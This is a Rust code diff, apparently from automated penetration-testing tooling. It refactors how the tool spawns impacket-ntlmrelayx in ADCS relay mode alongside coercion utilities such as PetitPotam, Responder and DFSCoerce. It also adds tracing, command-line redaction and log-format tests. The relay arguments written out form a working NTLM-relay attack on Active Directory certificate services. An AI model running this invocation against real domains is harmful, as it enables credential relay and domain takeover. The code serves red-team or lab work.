@@ -462,6 +462,10 @@ async fn wait_for_port_free(port: u16, timeout: Duration) -> std::result::Result
 
 struct RealCoerceProcs;
 
+/// Long-lived relay binary. Named once so the span attributes and the spawned
+/// program cannot drift apart.
+const RELAY_BIN: &str = "impacket-ntlmrelayx";
+
 struct RealRelayHandle {
     child: Child,
 }
@@ -538,14 +542,13 @@ impl CoerceProcs for RealCoerceProcs {
             "Responder.py",
             "impacket-petitpotam",
         ] {
-            let _ = TokioCommand::new("pkill")
+            let _ = CommandBuilder::new("pkill")
                 .arg("-f")
                 .arg(pat)
-                .stdin(Stdio::null())
-                .stdout(Stdio::null())
-                .stderr(Stdio::null())
                 .current_dir(workdir)
-                .status()
+                .stdin_null()
+                .timeout_secs(10)
+                .execute()
                 .await;
         }
         sleep(Duration::from_millis(500)).await;
@@ -565,25 +568,42 @@ impl CoerceProcs for RealCoerceProcs {
         // them (and not in the worker's `/`). --keep-relaying prevents the
         // first inbound (often anonymous) connection from causing "All targets
         // processed!" before the real coerced DC calls back.
-        let child = TokioCommand::new("impacket-ntlmrelayx")
-            .arg("-t")
-            .arg(target_url)
-            .arg("--adcs")
-            .arg("--template")
-            .arg(template)
-            .arg("-smb2support")
-            .arg("--keep-relaying")
-            .arg("--no-da")
-            .arg("--no-acl")
-            .arg("--no-validate-privs")
-            .arg("--no-dump")
-            .current_dir(workdir)
-            .stdin(Stdio::piped())
-            .stdout(Stdio::from(relay_log_out))
-            .stderr(Stdio::from(relay_log_err))
-            .kill_on_drop(true)
-            .spawn()
+        let relay_args: Vec<String> = vec![
+            "-t".into(),
+            target_url.into(),
+            "--adcs".into(),
+            "--template".into(),
+            template.into(),
+            "-smb2support".into(),
+            "--keep-relaying".into(),
+            "--no-da".into(),
+            "--no-acl".into(),
+            "--no-validate-privs".into(),
+            "--no-dump".into(),
+        ];
+        let redacted_cmd = crate::redact::redact_command_line(RELAY_BIN, &relay_args);
+        let span = tracing::info_span!(
+            "exec.relay",
+            otel.name = "exec.impacket-ntlmrelayx",
+            otel.kind = "client",
+            "process.executable.name" = RELAY_BIN,
+            "process.command_line" = %redacted_cmd,
+            "process.command_args.count" = relay_args.len(),
+            "relay.pid" = tracing::field::Empty,
+        );
+        let child = span
+            .in_scope(|| {
+                TokioCommand::new(RELAY_BIN)
+                    .args(&relay_args)
+                    .current_dir(workdir)
+                    .stdin(Stdio::piped())
+                    .stdout(Stdio::from(relay_log_out))
+                    .stderr(Stdio::from(relay_log_err))
+                    .kill_on_drop(true)
+                    .spawn()
+            })
             .context("failed to spawn impacket-ntlmrelayx (is it installed?)")?;
+        span.record("relay.pid", child.id().unwrap_or(0));
         Ok(RealRelayHandle { child })
     }
 
@@ -596,15 +616,18 @@ impl CoerceProcs for RealCoerceProcs {
         cwd: &Path,
         timeout_secs: u64,
     ) {
-        let mut cmd = TokioCommand::new(bin);
-        for a in args {
-            cmd.arg(a);
-        }
-        cmd.current_dir(cwd).stdin(Stdio::null());
-        let timeout = Duration::from_secs(timeout_secs);
-        match tokio::time::timeout(timeout, cmd.output()).await {
-            Ok(Ok(out)) => append_output(coerce_log, header, &out).await,
-            Ok(Err(e)) => append_error(coerce_log, header, &format!("spawn failed: {e}")).await,
+        let result = CommandBuilder::new(bin)
+            .args(args.iter().map(|a| (*a).to_string()))
+            .current_dir(cwd)
+            .stdin_null()
+            .timeout_secs(timeout_secs)
+            .execute()
+            .await;
+        match result {
+            Ok(out) => append_output(coerce_log, header, &out.stdout, &out.stderr).await,
+            Err(e) if crate::executor::spawn_error_kind(&e).is_some() => {
+                append_error(coerce_log, header, &format!("spawn failed: {e}")).await
+            }
             Err(_) => {
                 append_error(
                     coerce_log,
@@ -973,7 +996,12 @@ fn coerce_secret_args(secret: Option<&CoerceSecret>) -> Vec<String> {
     }
 }
 
-async fn append_output(path: &Path, header: &str, output: &std::process::Output) {
+/// Append one phase's captured output under a `=== <header> ===` banner.
+///
+/// The wire format is `"=== " header " ===\n" stdout stderr "\n"` — the same
+/// byte sequence the pre-`CommandBuilder` version wrote from a
+/// `std::process::Output`, now fed the executor's UTF-8 sanitized fields.
+async fn append_output(path: &Path, header: &str, stdout: &str, stderr: &str) {
     use tokio::io::AsyncWriteExt;
     if let Ok(mut f) = tokio::fs::OpenOptions::new()
         .create(true)
@@ -984,9 +1012,10 @@ async fn append_output(path: &Path, header: &str, output: &std::process::Output)
         let _ = f.write_all(b"=== ").await;
         let _ = f.write_all(header.as_bytes()).await;
         let _ = f.write_all(b" ===\n").await;
-        let _ = f.write_all(&output.stdout).await;
-        let _ = f.write_all(&output.stderr).await;
+        let _ = f.write_all(stdout.as_bytes()).await;
+        let _ = f.write_all(stderr.as_bytes()).await;
         let _ = f.write_all(b"\n").await;
+        let _ = f.flush().await;
     }
 }
 
@@ -1003,6 +1032,7 @@ async fn append_error(path: &Path, header: &str, msg: &str) {
         let _ = f.write_all(b" ===\n[ERROR] ").await;
         let _ = f.write_all(msg.as_bytes()).await;
         let _ = f.write_all(b"\n").await;
+        let _ = f.flush().await;
     }
 }
 
@@ -2000,6 +2030,38 @@ MIIBlahSecondCert==\n\
         mock::push(mock::success());
         let args = json!({});
         assert!(ntlmrelayx_multirelay(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn append_output_writes_banner_then_stdout_then_stderr() {
+        let dir = tempfile::tempdir().unwrap();
+        let log = dir.path().join("coerce.log");
+        super::append_output(
+            &log,
+            "DFSCoerce",
+            "coerced 192.168.58.20\n",
+            "warn: retry\n",
+        )
+        .await;
+        let bytes = std::fs::read(&log).unwrap();
+        assert_eq!(
+            bytes,
+            b"=== DFSCoerce ===\ncoerced 192.168.58.20\nwarn: retry\n\n",
+            "framing drifted: {:?}",
+            String::from_utf8_lossy(&bytes)
+        );
+    }
+
+    #[tokio::test]
+    async fn append_error_writes_banner_then_error_marker() {
+        let dir = tempfile::tempdir().unwrap();
+        let log = dir.path().join("coerce.log");
+        super::append_error(&log, "DFSCoerce", "timed out after 25s").await;
+        let text = std::fs::read_to_string(&log).unwrap();
+        assert_eq!(
+            text, "=== DFSCoerce ===\n[ERROR] timed out after 25s\n",
+            "framing drifted: {text}"
+        );
     }
 
     #[tokio::test]
